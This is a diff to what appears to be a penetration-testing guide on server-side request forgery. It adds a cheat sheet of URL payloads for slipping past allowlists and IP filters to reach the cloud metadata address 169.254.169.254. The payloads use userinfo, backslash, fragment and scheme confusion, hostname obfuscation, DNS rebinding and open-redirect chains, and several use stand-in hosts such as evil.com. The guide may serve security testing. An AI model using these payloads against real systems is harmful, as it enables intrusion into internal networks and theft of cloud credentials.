@@ -94,13 +94,55 @@ curl -x localhost:8080 -k "https://target.com/fetch?url=http://169%25252e254%252
 ```
 Combine with IP encoding variants above — double-encode the hex IP for maximum bypass depth.
 
-### 6. URL parser edge cases (if all encoding fails)
-Some parsers also fail on:
+### 6. URL validation bypass (host/scheme/auth confusion)
+When the filter validates the URL structure (allowlisted host, scheme check), not just the IP:
+
+**Embedded credentials (userinfo):**
 ```
-http://169.254.169.254@attacker.com/  (userinfo confusion)
-http://attacker.com#@169.254.169.254  (fragment confusion)
-http://169。254。169。254/              (fullwidth dots)
-http://169.254.169.254:80/             (explicit port)
+http://allowed.com@169.254.169.254/     → browser sends to 169.254.169.254, filter sees allowed.com
+http://169.254.169.254@allowed.com/     → some parsers extract host as allowed.com (passes allowlist)
+http://allowed.com:anything@evil.com/   → userinfo = "allowed.com:anything", host = evil.com
+```
+
+**Backslash as path separator:**
+```
+http://allowed.com\@169.254.169.254/    → some parsers treat \ as / (WHATWG spec converts \ to / in special schemes)
+http://evil.com\allowed.com             → parser confusion on host boundary
+```
+
+**Fragment confusion:**
+```
+http://evil.com#@allowed.com            → filter parses host as allowed.com (after #@), actual host is evil.com
+http://evil.com%23@allowed.com          → encoded # bypasses fragment-aware parsers
+```
+
+**Scheme tricks:**
+```
+http://169.254.169.254               → blocked
+//169.254.169.254                     → scheme-relative, inherits current scheme, may bypass scheme check
+http:169.254.169.254                  → scheme without // (valid per RFC, some parsers accept)
+http:///169.254.169.254               → triple slash, parser confusion
+```
+
+**Hostname obfuscation:**
+```
+http://169.254.169.254./              → trailing dot (FQDN), bypasses string match
+http://169.254.169.254%00.allowed.com → null byte truncation (legacy parsers)
+http://[::ffff:169.254.169.254]/      → IPv6 brackets bypass IPv4 regex
+http://0xa9fea9fe/                    → no dots at all (integer IP)
+```
+
+**DNS rebinding** (when filter resolves then fetches separately):
+```
+1. Register domain with TTL=0 pointing to allowed IP
+2. Filter resolves → allowed IP → passes check
+3. TTL expires, re-resolves → 169.254.169.254
+4. Fetch hits internal IP
+```
+
+**Open redirect chain** (when filter checks initial URL but follows redirects):
+```
+http://allowed.com/redirect?url=http://169.254.169.254/latest/meta-data/
 ```
 
 ## Why First-Octet Hex Specifically
